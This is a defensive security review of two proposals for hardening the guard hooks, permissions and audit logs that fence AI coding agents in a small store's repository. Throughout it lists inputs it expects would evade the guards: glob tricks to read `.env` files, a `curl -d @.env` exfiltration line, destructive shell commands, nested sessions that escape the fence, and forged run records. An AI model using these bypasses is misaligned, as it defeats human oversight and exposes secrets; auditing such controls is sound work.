# Security review of Proposal A and Proposal B

| | |
|---|---|
| Date | 2026-10-11 |
| Reviewer | `security-engineer`, briefed by the Chief Engineer on the owner's instruction |
| Subject A | `docs/operations/sre-architecture-phase-brief.md` (by `devops-sre`) |
| Subject B | `docs/status/security-hardening-plan-2026-10-11.md` (by the Chief Engineer) |
| Kind of review | Planning and document review, plus a reading of the guard code. Nothing is approved by this document. I fixed nothing. |

## 0. How to read this

**Method.** Read tool and one Write (this file). No shell command was run. No guard was probed, bypassed or tested. **Every weakness below that describes an input getting past a guard is static analysis: read from the source, not executed.** Statements about how Claude Code itself behaves (settings precedence, sandbox keys, how the search tool treats ignored files, whether rule and agent folders are scanned recursively) are from my recollection of its documentation and are marked *to confirm*; none was observed in this work.

**Labels.** *Observed*: I read it in a file today. *Static*: a conclusion from reading code. *To confirm*: an assumption about the harness that somebody must test. *Proposed*: my recommendation.

**Severity.** Critical, high, medium, low. There is **no critical finding**, because today there is no application, no secret, no customer data and no production system to lose. Several high findings would become critical if they were still open on the day a live payment credential, a storage key or customer data becomes reachable from this machine; those are marked "becomes critical".

**Verdict in three lines.**

1. Both proposals are honest about being proposals and both are worth the owner's time. Neither needs to be withheld from the owner. **Neither should be approved as written.**
2. Proposal A needs five amendments before the phase starts (section 1.5). The most important: `devops-sre` should hold no shell in a documentation-only phase, and that should be enforced by the harness, not by a rule.
3. Proposal B: Wave 0 can go ahead with the additions in section 2.7. **Wave 1 should be revised before the owner approves it**, because its first layer does not do what section 1 of the plan says it does for any role that can both write code and run it, three of its "after" claims are wrong on my reading of the code, and it leaves five high-severity holes that nobody has raised (section 2.4).

---

## 1. Part 1: Proposal A

Reviewed in full: area A secret handling, area B credential separation and release control, area D backup isolation, area E, section 5. Read for context: the rest.

What the brief gets right, so it is not lost: it names agents as identities (E.1), asks how a secret reaches a process "without touching the repository, a log or a command line" (A.5), asks where audit records live "so the audited party cannot alter them" (E.5), puts signed download links on the logging redaction list (C.2), offers backup storage with no delete permission (D), states that a restore is unproven until run, and says in its own risk 2 that the fence is "a rule, not a mechanism". The citations to `CLAUDE.md` gates 2, 4, 5 and 6 are correct. The rule it quotes about `devops-sre` not rotating secrets matches `.claude/agents/devops-sre.md:27`.

### 1.1 Is the section 5 fence sufficient? No.

**SA-01. High. The fence leaves `devops-sre` holding an unrestricted shell in a phase that does not need one.**
- Location: brief section 5 rules 1 to 8; `path-guard.mjs:45-49` and `:68` (no `BASH_ALLOW` entry for `devops-sre`, so every command exits 0). Proposal B section 2 says "the documentation-only SRE phase needs none of Wave 1 applied, provided the working rules in the phase brief are followed". That is circular: the control is that the rule is followed.
- Scenario (static): `devops-sre`, working from a document it is told to treat as data, or simply making a mistake, runs any of the following. None matches a `deny` or `ask` pattern and none reaches a guard: `rm -r docs/security`, `: > CLAUDE.md`, `pnpm install`, a redirect that rewrites `.claude/hooks/path-guard.mjs` or `.claude/settings.json`, an append to `.claude/logs/agent-runs.jsonl`, or `claude -p "<prompt>"`, which starts a nested plain session that has no agent type and is therefore not fenced by `path-guard` at all (`path-guard.mjs:64`).
- Impact: the role with the weakest technical fence can alter the guards, the run log and the approval rules themselves, in a repository with no commits, so nothing afterwards can show it happened (SA-02).
- Why the written list does not fix it: rules 2 and 4 are lists of command spellings, which is the same weakness Proposal B section 1 identifies in the permission rules. Not on the lists: `npm i`, `npm ci`, `npm exec`, `pnpm update`, `pnpm exec`, `pnpm env`, `bun`, `pip`, `git clone`, `curl` without a pipe, `node -e`, `cp` over an existing file, `sed -i`, `tee`, `>>`, `git add`, `git commit`, `git config`, and `claude` itself. Rule 1 ("writes only under `docs/operations/`") covers them in principle but does not say "by any tool, including the shell".
- Evidence problem: compliance is shown by the specialist's own "Commands run" list (criterion 17). A self-report cannot evidence the absence of a command. No shell audit trail exists; the run log records only that a run ended.
- Recommendation, in order of preference:
  1. Adopt decision 2 option (b), **no shell use at all**, and make it the default, not an alternative. Writing Markdown needs Read, Write and Edit only. This review was produced under exactly that constraint.
  2. Enforce it in the harness, not in prose. Two routes, both the owner's to choose: (i) the owner directs a one-line change giving `devops-sre` a `BASH_ALLOW` entry equal to `READ_ONLY_GIT` (this is H-01 for one role, pulled forward); or (ii) the phase's `devops-sre` sessions are started with the Bash tool removed by a launch flag. *To confirm* for (ii): that the flag exists on CLI 2.1.231 and applies to a delegated run and not only to a direct one.
  3. The acceptance evidence then becomes the harness start-up record showing the tool list without Bash, which is harness-grade, instead of criterion 17's self-report.
  4. Add to the fence, whatever route is taken: no connector or MCP tool use, no network access, no nested `claude` session, no git command that changes state.

**SA-02. High. There is no trustworthy baseline, so criteria 2 and 3 cannot detect the change that matters most.**
- Location: brief section 4 criteria 2 and 3; section 7 decision 5; section 8 risk 1.
- Observed: the repository has no commits (reviewer's report). The environment description given to this session also says the working directory is not a git repository, the same contradiction the brief records in risk 1. I ran no command, so it is still unresolved, now with two sessions reporting it.
- Scenario (static): with every file untracked, `git status --porcelain --untracked-files=all` prints the same line for a file before and after an edit. An edit to `.claude/hooks/path-guard.mjs`, `scripts/check-feature-ledger.mjs` or `CLAUDE.md` during the phase is invisible to criterion 2 and to criterion 3. Files that git ignores (`.claude/logs/`, `.claude/settings.local.json`, `.env*`, `.vscode/*`) are invisible even to add and remove. `devops-sre` owns `.gitignore` under `path-guard.mjs:32`, so one Edit there hides any path from the check, and `.gitignore` and `CLAUDE.md` are not in criterion 3's list.
- Recommendation: make decision 5 option (a), an initial commit by the owner, a precondition of the phase and not a choice. If the owner prefers not to commit yet, the owner records a SHA-256 list of every file, ignored files included, kept where no agent can write. Add `.gitignore`, `CLAUDE.md`, `.git/` configuration and `.claude/settings.local.json` to criterion 3. Resolve the "is this a git repository" question with one owner-run command before anything depends on it. Before that first commit, see N-17 on scanning the evidence transcripts.

**SA-16. Medium. The fence is silent about reading, connectors and the web.**
- The fence covers writes. It says nothing about reading credential files outside the project, about the connectors attached to every agent session (Proposal B H-29 lists Cloudflare, Gmail, Google Drive, Notion, Lovable), or about decision 6 option (b), giving an agent a web tool. An infrastructure agent with a live Cloudflare connector can create real resources without a shell; rule 5 forbids that in words only.
- Recommendation: add the rules in SA-01 item 4. For decision 6, prefer (a) or (c). If (b) is chosen, give the web tool only to a session that holds no shell and treat everything fetched as data.

**SA-18. Low. Decision 11, option (a), "run in parallel".** The hardening work must be done by a session the guards do not fence (N-18). Doing that in the same working tree at the same time as an unfenced `devops-sre` makes it impossible to say who changed what. Recommendation: sequential, never concurrent; and the minimum (SA-01, SA-02) first.

### 1.2 Missing security requirements for a store that takes payments and sells protected downloads

The brief asks good general questions. What it lacks are requirements specific to this business. Each item below is something the phase's documents should be required to contain, stated provider-neutrally because the provider is undecided.

**SA-03. High (becomes critical at launch). Payment webhooks and payment scope.**
- Missing from areas A, B, C, D and E: a separate webhook signing secret per environment, with test-mode and live-mode never shared; a rotation procedure with an overlap window in which two secrets verify; the infrastructure consequence that signature verification needs the unmodified request body, so no proxy, CDN or body parser may rewrite it; replay tolerance; where the processed-event record lives so duplicate events stay idempotent across restarts and across more than one instance (this bears directly on the "Redis at launch: none" option); what happens to that record and to entitlements after a database restore (a restore re-opens the duplicate window and loses grants made after the backup, so the restore procedure needs a reconciliation step against the provider); an alert on signature failures and on the provider disabling the endpoint; a rule that preview and staging environments never receive live events; and how webhooks are tested locally without placing a live key on the development machine.
- Also missing: a statement of intended card-data scope (hosted checkout so card data never touches the server) as a constraint on every hosting and logging option.
- Recommendation: add these as required content in areas A, C, D and E and as rows in the secret inventory and the alert table.

**SA-04. High (becomes critical at launch). Signed-link keys and storage credentials.**
- Area F question 5 covers per-request authorization and expiry. Nothing covers the key that signs the links. Required: which identity signs; that it can read single objects in the asset store and can neither list, write nor delete; a separate identity for admin upload; no public access and no listing on the store; maximum link lifetime; rotation and its effect on links already issued; where a leaked link can surface (logs, referrer headers, analytics, error tracker) and how each is closed; and a kill switch that invalidates all outstanding links.
- Abuse case the cost model must carry: one valid purchase or one leaked link, replayed in a loop, drives egress cost. Required: per-entitlement download limits, rate limits, and a spending alert or cap. Area F models egress as a cost; nobody models it as an attack.

**SA-05. High (becomes critical at launch). Backup isolation, encryption and deletion are options, not requirements, and have no acceptance criterion.**
- Location: area D option table "Backup isolation"; question 3 ("encrypted how"); criteria 6 and 11; deliverable row 4.
- Gap: "(a) same account as production" is offered as a legitimate alternative. For a store holding orders and entitlements it should be excluded by requirement: the application, CI and any agent session must hold no credential that can delete or overwrite a backup; deletion needs a different identity; retention lock where the vendor offers it.
- Also missing: who holds the backup encryption key, where the key itself is backed up, and what the loss of the owner's machine does to it; access logging on backup reads; the fact that backups hold personal data, so the retention table and any erasure duty apply to them; and the conflict between "restore into a scratch target" (area D) and the proposed default that real customer data never leaves production (area A). A restore drill either runs under production-grade controls or uses scrubbed data, and the document must say which.
- Disaster list (D.7) has "loss of the owner's own machine" and not "compromise of the owner's machine or of an agent session". Add it.
- Recommendation: add a criterion: "the backup document states which identity can delete a backup and shows that it is not the application's, CI's or an agent's; states where the encryption key is held; and states how the restore target is protected".

**SA-06. Medium. Audit log integrity is asked about and then dropped.** E.5 asks the right question. The "document must contain" list for area E has no audit section, no deliverable row carries one, and no criterion checks one. In a one-person business the audited party and the administrator are the same person, so the design must say what protects the record against a stolen owner credential and against the application itself: an append-only sink outside the application's write permission, retention, what each record holds, and which events are in scope (admin actions, entitlement grants and revocations, downloads, deployments, production access, configuration and secret changes). Baseline rule: "Admin functions ... are logged" (`.claude/rules/security.md`). Also missing anywhere: a procedure for a manual production data change, such as granting an entitlement by hand, which `CLAUDE.md` gate 5 makes an owner decision.

**SA-07. Medium. Personal data.** The brief defers jurisdiction to professional advice, which is fair. It should still require: a personal-data flag on every row of the data classification table; a list of every vendor that would process personal data (host, database, mail, error tracker, analytics, payment provider); personal data in logs, error reports and backups, with retention for each; how an access or deletion request would be met alongside order records that must be kept; and a statement that the retention table is provisional until the legal question is answered. Sales tax on digital goods commonly carries its own evidence-retention duty; *unverified*, flag it for the same adviser.

**SA-08. Medium. Supply-chain risk in CI.** B.7 and E.7 cover least privilege, pinning, lockfile, audit and install scripts in general terms. Required specifics: actions pinned to a full commit hash; the default workflow token read-only; no secret available to a job triggered from a fork or from an untrusted pull request; production credentials only in a protected environment that needs the owner's approval; who is able to change a workflow file, since any agent that can write `.github/` can make CI run its code with CI's credentials; install from a frozen lockfile; a policy on dependency install scripts; no automatic merge of dependency updates; workspace packages marked private so a public package of the same name cannot be substituted; artefact integrity between the job that tested it and the job that deploys it. The CI permission table should gain a column "who can modify this job".

**SA-09. Medium. Admin access and the owner's accounts as the root of trust.** E.2 covers who reaches production infrastructure. Not covered: how the first application admin account is created; a second factor and session lifetime for the admin area; a database user per component (the application cannot drop a collection; the backup job reads only; migrations use their own identity); the database never reachable from the public internet; a second factor, recovery codes and their storage for every vendor dashboard; and the owner's email account and domain registrar, which can reset everything else. The cost and vendor register can double as an account inventory if it gains columns for second factor and recovery method.

**SA-11. Medium. Security monitoring and abuse protection are absent.** Area C's alert table is about availability. Nothing requires alerts on repeated failed sign-ins, webhook signature failures, entitlement grants without a matching payment, admin sign-ins, or download spikes. Nothing asks where rate limiting is enforced or where its counters live, which is a baseline rule (`.claude/rules/security.md`) and depends on the Redis and hosting decisions.

**SA-12. Medium. Area A, secret handling.** Add: (a) a public or secret flag that also marks variables exposed to the browser bundle, with a rule that no secret carries the client-side prefix of the chosen build tool; (b) a start-up check that refuses a live key outside production and a test key inside it, alongside question 6 on missing variables; (c) which secrets a preview deployment receives, if the host creates one per pull request; (d) a plain statement that any secret in a local env file on the development machine must be assumed readable by code that agents run there (N-04, N-07), so it may only ever be a test-mode value with no monetary or data value; (e) the exposure runbook (E.4) must count "read into an agent's context, a session transcript or a memory plugin" as an exposure that triggers rotation.

**SA-17. Low.** No deliverable is a threat model (assets, trust boundaries, attacker goals, abuse cases). Seventeen documents describe controls without one stating what they defend against. Proposed: a short one, owned by the Software Architect, reviewed by the Security Engineer, or fold it into deliverable 5.

**SA-15. Low to medium. Where these documents will live.** Whether the repository is public is unverified (decision 8d). Access procedures, the identity matrix and incident runbooks are useful to an attacker. Decide 8(d) before area E is written, and add a rule beside rule 17: no account identifiers, bucket names, project identifiers, internal addresses or personal email addresses in any deliverable.

### 1.3 Review coverage in the deliverables table

**SA-10. Medium.**
- Row 12, the Redis decision record, lists no Security Engineer review. Redis decides where sessions, rate-limit counters and webhook idempotency records live. Add Sec.
- Criterion 13 and row 15 require the security review to cover rows 1, 2, 4, 5, 6 and 13. Rows 3, 7, 9, 10, 11 and 14 list Sec as a reviewer but nothing checks that review happened. Align them.
- "Sec review on file" (rows 1, 2, 6) tests that a file exists, not what it found. Only row 5 mentions findings.
- Only a critical finding blocks. An unresolved high finding passes silently. Proposed: each unresolved high needs the owner's recorded acceptance by name.
- "Sec" and "Sec (mandatory)" appear side by side while rule 11 says the review is mandatory for the phase. Say which rows are optional, or remove the distinction.

### 1.4 Acceptance criteria touching security that cannot be checked objectively

**SA-13. Medium.**

| Criterion | Why it is not objective | What would make it so |
|---|---|---|
| 2, 3 | No commit, so edits are invisible; ignored files invisible; `.gitignore` and `CLAUDE.md` not listed; nobody is named to capture the baseline | SA-02 |
| 5 | "No document describes a choice as made" is a judgement over prose | Acceptable as a reviewer judgement; say so |
| 9 | "at least at section level" has no test | Define the unit: every section heading carries one of the three labels |
| 10 | "No secret value appears" is a negative over free text with no method; the Independent Reviewer has no content search (record D1) | Name the scan: defined patterns (private-key headers, known key prefixes, connection strings with credentials, long high-entropy strings), who runs it, and its output on file. Extend to account identifiers (SA-15) |
| 13 | "covers" and "resolved" are undefined; who declares a finding resolved is unstated | Resolved means re-verified by the Security Engineer, not by the author or the Chief Engineer. Add a table mapping each line of `.claude/rules/security.md` to the section that meets it, so "the design meets the baseline" is a lookup |
| 17 | A self-reported command list cannot show a command was not run | SA-01 item 3: the harness tool list |
| none | Backup deletion rights, encryption key custody, audit log design, webhook and signing-key rotation, second factor: no criterion at all | SA-03 to SA-06, SA-09 |

**SA-14. Low. Criterion 2 fails by construction.** Section 3's path list does not include the hand-tracking file Proposal B recommends (`docs/status/sre-architecture-phase.md`), the saved Independent Reviewer report (row 17 gives no path), or this review. Any of them is "a file outside the section 3 paths". List them or widen the criterion to named folders.

### 1.5 Amendments I would ask for before the owner approves Proposal A

1. SA-01: no shell for `devops-sre`, harness-enforced; fence extended to connectors, network and nested sessions.
2. SA-02: owner's commit or hash baseline as a precondition; criterion 3 extended.
3. SA-03, SA-04, SA-05: the payment, signed-link and backup requirements added as required content, each with a criterion.
4. SA-10: Sec on row 12; criterion 13 aligned with the table; unresolved highs need the owner's recorded acceptance.
5. SA-13: criteria 10, 13 and 17 rewritten so somebody can check them.

SA-06 to SA-09, SA-11 and SA-12 can be added to the scope text without changing the structure of the phase.

---

## 2. Part 2: Proposal B

### 2.1 Citation check

I checked every file and line citation in H-01 to H-30 that points into a file I could read. **No line number is wrong.** Confirmed: `path-guard.mjs:21-23, 26, 29-30, 32, 41-49, 57-61, 64, 68, 81`; `secret-guard.mjs:9-14, 12, 21-26, 31, 37-45`; `log-agent-run.mjs:14, 26`; `check-feature-ledger.mjs:20-23, 24, 27, 55, 64, 65, 74, 76, 77, 84-85, 104`; `test-guards.mjs:81, 82`; `settings.json:2, 5-12, 5-19, 19, 21-41, 27-28, 44-53, 64-73`; `.gitignore:12-18, 26`; `_TEMPLATE.md:4`; `SKILL.md:14-16`; `chief-engineer.md:4`; `qa-test-engineer.md:4, :15`; `da-vinci.md:4`. The count of 58 test cases is right (26, 12, 11, 2, 7). `.claude/agents/*.md:4` was confirmed for five of ten agent files; the other five were not read.

Statements that are wrong or inconsistent, as opposed to mis-cited:

| Where | Problem |
|---|---|
| H-06, regressions | "A file ... such as `Example.Key`, is now blocked." It is blocked today: the extension test at `secret-guard.mjs:12` already carries the `i` flag. The case gap is only in the `.env` and `id_*` tests at lines 10, 11 and 13. |
| H-08, tests | "Agent named `constructor` is blocked" after the change. With `Object.hasOwn`, `constructor` is not a known role, so `path-guard.mjs:64` exits 0 and the write is **allowed**. Before: allowed by a crash. After: allowed by design. The test as described would fail, and it should, because it exposes N-01. |
| H-14, proposed change | "A probe record then cannot stand in for real work." As written, the check requires only that the id exists with the same agent name. The nine probe ids are in the log and any role can Read them. See H-14 below. |
| H-18, location | `settings.json:44-53` does not apply "to every tool call". The matcher at line 46 lists seven tools. Anything else, including every connector tool, is unguarded (N-06). |
| H-10, abuse | Says the Write and Edit path to the log is "covered by the protected-prefix check in H-16". H-16 is Wave 2 and H-10 is Wave 1. And the check as described applies to "every named agent"; the sessions that can reach the log with Write today are the unnamed ones (N-01, N-02). |
| Section 2 table against the entries | H-17, H-18 and H-30 are in the Wave 2 row; their entries say the work is a Wave 0 probe. H-20 is in Wave 0, defined as "no configuration change", and its entry edits the skill under `.claude/`. |
| Section 2, procedure | "apply the change ... then the owner approves" conflicts with the header's "needs the owner's explicit approval before anyone implements it". Two different approvals are meant; say so. |
| Section 1 | "Every role that holds Bash gets a default-deny allowlist (H-01)." H-01 adds four entries. A session with no agent type, and any agent type not in `OWNED`, still get none. |

### 2.2 Finding by finding

Format: **severity** as I see it against the plan's; **closes?** with an input I believe still gets through after the proposed change (static, not executed); **gaps** in the stated abuse cases and regressions; **wave**.

**H-01, shell allowlists.** Severity: high, agreed. Closes? **Partly.** It stops a mistyped `rm`. It does not remove the capability, because the proposed list is a general code runner for any role that can also write code:
- `qa-test-engineer` writes `apps/web/src/x.test.ts` (its lane, `path-guard.mjs:22`) containing file deletion, a write to another lane, a read of an env file, or a child process, then runs `pnpm test`. Same for `frontend-engineer` with `apps/web/vite.config.ts`, and for any `playwright.config` or `vitest.config` at any depth (`:23`).
- `pnpm exec prettier --write CLAUDE.md`; `pnpm exec tsc --outDir docs/status`; `pnpm exec eslint --fix` with a config that loads code; `pnpm exec playwright install`, which is a download. All are inside "`pnpm exec <tsc|eslint|prettier|vitest|playwright> ...`".
- Depending on how the patterns are anchored: a pnpm flag before the subcommand (`-C <dir>`, a second `--filter`, shell mode).
Gaps: the plan names `pnpm run` plus an editable `package.json` and stops there; test files and tool configs are the wider case and H-04 does not touch them. No regexes are given, so nobody can review the allowlist itself. Wave 1: right. Requirement: H-02 must be designed on the assumption that these roles run arbitrary code (N-04).

**H-02, sandbox.** Severity: high, agreed. Closes? **Only for the four listed paths, and only if seven things I could not confirm are true.**
- Not protected by the proposed `denyWrite`: `CLAUDE.md`, `.gitignore`, root `package.json`, lockfiles, `.npmrc`, every other role's lane, `.git/` configuration and hooks, `.vscode/`, `.mcp.json`. Input after the change: the test file in H-01 overwriting `CLAUDE.md` or another lane.
- No `denyRead` is proposed, so anything a role executes can read an env file or a home-directory credential (N-07).
- No network policy is stated. If the registry is reachable, installs are stopped by command text only; if it is not, `pnpm audit`, on the Security Engineer's allowlist, stops working. The plan names neither.
- *To confirm* on 2.1.231, beyond what the plan lists: that the sandbox binds delegated subagents and sessions started from the extension; that a git-ignored `.claude/settings.local.json` or the user-level settings cannot switch it off (N-05); the default of the auto-allow option for sandboxed commands and whether `ask` rules still prompt under it; that `allowUnsandboxedCommands: false` really removes the per-command escape. Observed: the Bash tool offered to this session has a per-command parameter for disabling the sandbox, so that setting is load-bearing.
- The safe verification is invalid once H-01 lands: `touch scripts/_probe.txt` from an agent session will be refused by the allowlist before it reaches the sandbox, and the result will read as a pass. The sandbox has to be probed from a session with no allowlist, with a child process and not only a shell builtin, against each protected path.
Wave 1: right.

**H-03, ownership audit.** Severity: medium in the plan; I would say **high priority inside Wave 1**, because after H-01 and H-02 it is the only control over a cross-lane write made by executed code or through a link. Closes? **Partly.**
- A file already modified before the run and modified again shows an identical status line. The snapshot must hold content hashes, not names.
- Ignored paths are invisible: the run log, local settings, env files, `.vscode/`, `node_modules/` (a tampered dependency persists unseen).
- `devops-sre` owns `.gitignore` (`path-guard.mjs:32`): one in-lane edit blinds the audit for any path (N-16).
- The main session and direct `--agent` sessions are never subagents, so they are never audited.
- A background process started in the run can write after the stop hook has reported clean.
- The hook runs `git` outside the sandbox, in a repository whose `.git/config` nothing protects (N-15).
- The violation is reported to the Chief Engineer and appended to a log nobody else reads. The ledger check should fail on a cited run that carries a violation.
- Where the snapshot is stored is unstated; it must be somewhere no agent can write.
Wave 1: right.

**H-04, installs and manifests.** Severity: high, agreed. Closes? **Partly.**
- `ask` list, inputs not matched: a flag before the subcommand (`pnpm --filter web add x`, `pnpm -C apps/web install`), which may be what the reviewer's R4 meant and QA's W10 could not parse; `pnpm exec`, `pnpm create`, `pnpm import`, `pnpm env use`, `npm exec`, `npm add`, `npm update`, `npm init <name>`; other ecosystems; an absolute path to the binary. Whether `pnpm i *` matches a bare `pnpm i` depends on H-30, which is scheduled after this.
- Manifest prompt, not listed: `.gitignore`, `.pnpmfile.cjs`, `eslint.config.*`, `vite.config.*`, `vitest.config.*`, `playwright.config.*` (all execute when a tool runs), `docker-compose*`, `.nvmrc`, `.env.example`, `CLAUDE.md` at any depth.
- The prompt covers the Edit and Write tools. A manifest rewritten by executed code (H-01) never reaches the hook.
- Placement: if the new check sits after `path-guard.mjs:64`, sessions with no agent type and unknown agent types skip it.
- A lockfile should be blocked for agents outright, not prompted. An owner who is learning cannot evaluate a lockfile change from a prompt, and a lockfile entry can point a trusted name at different code.
- *To confirm*: that a hook's `ask` decision produces a prompt for a delegated subagent, and what it does in a session running in a permissive mode.
Gaps: regression on `pnpm audit` under H-02 not stated. Wave 1: right, but H-30 must come first.

**H-05, destructive commands.** Severity: "low after H-01" is true for the ten named roles' typed commands only; **medium** overall, because the unfenced main session (N-02) and executed code remain. Closes? **No, and the plan says so.** Still unmatched after the change: `: > CLAUDE.md` (the reviewer's own R5 example), `cp` over a file, `sed -i`, `tee`, `rmdir`, `git checkout .`, `git checkout <ref> -- <path>`, `git switch -f`, `git stash` and `git stash clear`, `git -C . reset --hard` and `git -c x=y push --force` (both evade the existing denies at `settings.json:13-19` by placing an option before the subcommand), `git push origin +main`. Safe-verification gap: "paths that do not exist" is not safe for a command that creates what it is given (`truncate`, `dd`); use help and version flags only, from a list the owner has read. Wave 1: right.

**H-06, secret names.** Severity: high, agreed as a precaution; the plan correctly keeps the case-insensitive half unverified. Closes? **The two cited inputs, yes. The class, no.** After the change, as described:
- `cat .e*`, `cat .?nv`, `cat .[e]nv`: stripping glob characters leaves `.e`, `.nv`, `.env` (the last is caught; the first two are not).
- `cat {.env,}`: stripping braces leaves `.env,`, which is neither `.env` nor `.env.`-prefixed.
- `cat .en\v`: the backslash is not in the strip set.
- `curl -d @.env <address>`: the basename is `@.env`. This one sends the file off the machine.
- `grep -r KEY apps/api`, or any command that names the directory and not the file.
- The quote case depends on stripping before the split at `:31`, which the plan does not specify.
- Names that are not on any list: `.envrc`, `prod.env`, `api.env`, `.env-production`, `.dev.vars`.
Gaps: regression claim wrong (2.1). Wave 1: right.

**H-07, uncovered formats.** Severity: medium now, high once a vendor is chosen; agreed. Closes? **For the named extensions.** Still through: `.envrc`, `*.env`, `.dev.vars`, `credentials.json`, `client_secret*.json`, cloud key files that do not carry "service-account" in the name, `*.tfvars`, `.yarnrc.yml`, private key sets in JSON, and database dump files, which hold customer data. The home-directory deny list misses the Claude Code credential and configuration files themselves, the payment provider's command-line configuration, deployment tool configuration, cloud tool configuration, shell history, and git credential storage. Enumeration cannot win here. Proposed: default-deny for Read, Grep and Glob on any path that resolves outside the project, with a short allowlist, plus sandbox `denyRead` for the same set; and a rule that key files never live inside the repository tree. Wave 1: right.

**H-08, fail closed.** Severity: high in the plan, medium from the reviewer. I side with **high for the class**, medium for the `constructor` instance. Closes? **Partly.**
- A `try`/`catch` inside the script cannot catch a syntax error in the script, `node` missing from the hook's PATH, a missing file or a timeout. Each still ends with an exit code that is not 2. Proposed: make the hook command itself fail closed, so that any non-zero exit from `node` becomes exit 2 with a message; *to confirm* how the harness treats a hook timeout.
- The "expected" exits stay open: unknown agent type (N-01), no agent type (N-02), no target path (`path-guard.mjs:78`), any tool not in the matcher (N-06).
- Interaction with H-12, not raised: the suite checks exit codes only (`test-guards.mjs:20-24, 32`). Once guards exit 2 on any internal error, a guard that crashes makes **every BLOCK case pass**. The suite must assert the message, not just the code. The same applies to H-04: an `ask` decision is exit 0 with output, which the suite cannot tell from ALLOW.
- Recovery: a second route that needs no flag is the owner editing `.claude/settings.json` in an ordinary editor. Document that; it removes the dependence on `--safe-mode`.
Wave 1, first: right.

**H-09, direct sessions unlogged.** Severity: medium, agreed. Closes? Yes for presence. New abuse case not stated: once a direct session writes a genuine record, anything with a shell that can run `claude -p --agent <role> "Reply ok"` manufactures a harness-written record for any role without touching the log file. Proposed: the checker does not count `kind: direct` unless the stage says the owner ran it. The record also lacks a start time, so a five-second run and an hour of work look the same. Wave 1: acceptable.

**H-10, forged run records.** Severity: high, agreed. Closes? **For a shell append by a named role.** Still through: the Write tool from a session with no agent type or an unknown agent type; the checker's `--log` option, which avoids the real log altogether (N-03); a trivial delegation, which produces a real but hollow record. Under-treats R3: the reviewer offered "move the log outside the repo" and "append-only at the filesystem level"; the plan discusses neither. Rejecting a signature is reasonable. A cheaper measure is not considered: each record carries a hash of the previous one, and the owner notes the latest hash in a committed file when a phase opens; removal or editing of earlier records is then detectable. Wave 1: right, but it depends on H-16.

**H-11, missing log.** Severity: high, agreed. Closes? **The deletion case, yes. The purpose, no.**
- `check-feature-ledger.mjs:17-18` accept `--dir` and `--log`. The Chief Engineer's allowlist admits the command with any arguments (`path-guard.mjs:46`). Input: `node scripts/check-feature-ledger.mjs --log docs/status/runs.jsonl`, where that file was written by the Chief Engineer in its own lane. The output is indistinguishable from a real pass, because the script prints neither path (N-03).
- The proposed `--no-run-log` flag is admitted by the same allowlist. "The workflow forbids it" is a rule. No existing fixture needs it: all seven pass an existing log (`test-guards.mjs:108, 127`). Drop the flag.
Wave 1: right.

**H-14, run-id binding.** Severity: medium, agreed. Closes? **Not as written.** Input after the change: a stage line citing the `agentId` of the 06:41 probe record for the same agent. It exists and the name matches. Required as well: the record's time is on or after `started`; an id is cited by one stage of one ledger only; a null id is rejected; session id and agent id are matched as a pair (*to confirm* that agent ids are unique across sessions); a stage with two agents carries two ids. And the `run:` field has to sit before `evidence:`, or `STAGE_LINE`'s trailing `(.*)` swallows it. Even then, an id proves that an agent of that name finished a run, not that it did this work. The binding becomes meaningful if the stop hook also records what the run changed (from H-03) and the checker requires the stage's evidence path to be among those files. Wave 1: right.

**H-13 and the design tier.** See 2.6.

**H-15, links.** Severity: medium, agreed. **Wave is wrong: Wave 1.** "Needs a shell to create the link, which H-01 removes" does not hold. A pnpm workspace creates links by design: after the first install, `apps/web/node_modules/<workspace package>` is a link into `packages/shared`. Input: `frontend-engineer` writes `apps/web/node_modules/<shared package>/src/types.ts`; it matches `^apps\/web\/` and lands in the backend's lane. Executed code can also create a link (H-01). Closes? Partly: "the nearest existing parent" misses the case where the target file itself is an existing link; resolve the target when it exists, and resolve the project root the same way.

**H-16, patterns reaching into protected folders.** Severity: medium in the plan; **high** on my reading, and **Wave 1**, both because H-10 depends on it and because the reach is worse than "not self-executing":
- `qa-test-engineer` may write any path containing `__tests__/` (`path-guard.mjs:21`). *To confirm*, since it depends on the harness scanning these folders recursively: `.claude/rules/__tests__/x.md` would be loaded as a rule for every agent, and `.claude/agents/__tests__/x.md` could define a new agent type, which N-01 leaves unfenced.
- Closes? Partly. A prefix check on `.claude/` and `scripts/` misses: a different-case spelling on a case-insensitive volume (`.Claude/__tests__/x.mjs`, `Scripts/x.spec.mjs`), which is the same assumption H-06 makes; and nested instruction files inside a role's own lane, which no proposal mentions: `apps/web/CLAUDE.md`, `docs/operations/CLAUDE.md`, `apps/web/.claude/...` (N-11).
Proposed: compare lower-cased real paths; protect `.claude/` and `CLAUDE.md` at any depth, `scripts/`, `.git/`, `.mcp.json`, `.vscode/`.

**H-17, content search.** Severity: medium, unverified; I would hold it at **high until probed**, and the probe belongs in **Wave 0**. Two static points against QA's W4 doubt, both *to confirm*: the search tool's `glob` parameter is checked only by exact basename (`secret-guard.mjs:42`), so `glob: ".env*"` or `".e*"` passes the hook, and in the underlying search program an explicit include pattern takes precedence over ignore files. And the proposed fix covers content mode only: a search in files-with-matches or count mode with a pattern such as `^NAME=sk_live_a` is a yes-or-no oracle on a secret's value. A fix has to exclude secret files from search, not restrict the output mode.

**H-18.** Low, agreed. Location wording wrong (2.1). Wave: the table disagrees with the entry.

**H-19, ledger weaknesses.** Severity: medium for (a) and (c). Part (b) is **high from the first feature that touches payments or access**: the mandatory security review in `.claude/rules/security.md` is switched on by a word the Chief Engineer types. A one-line justification is still self-declared. Proposed: derive the flag from what the feature's runs changed, once paths exist, and until then require the Security Engineer, not the Chief Engineer, to record "not security-sensitive". Also through after the change: evidence text that starts with a word and not a path; evidence citing any file that happens to exist. Wave 2 is too late for (b); it should precede the first product feature. See N-09 and N-10 for two further ledger weaknesses nobody has raised.

**H-12, test suite.** Medium, agreed. Gaps: the exit-code-only assertion (H-08); case `plain session with no agent` (`test-guards.mjs:65`) pins the unfenced main session as intended behaviour; the suite and the hooks it tests are both writable from a shell today and untracked, so a green run proves nothing about whether either was altered. "QA authors the cases": no named role can write under `scripts/` (N-18). Wave 1, first: right.

**H-20.** Low for security, agreed. One addition: a refusal with no route to the owner invites the workaround of a permissive mode or a standing allow rule. The written procedure should forbid both. Not a "no configuration change" item (2.1).

**H-21.** Low, agreed. One objection: "re-run four short probes with the instruction that the owner authorises the out-of-lane attempt". An instruction relayed by the Chief Engineer is not the owner's consent, and three roles rightly declined on that basis last time. Teaching agents to accept a relayed authorisation weakens the gate being tested. Proposed: the owner runs these probes personally, or they are dropped in favour of the synthetic tests.

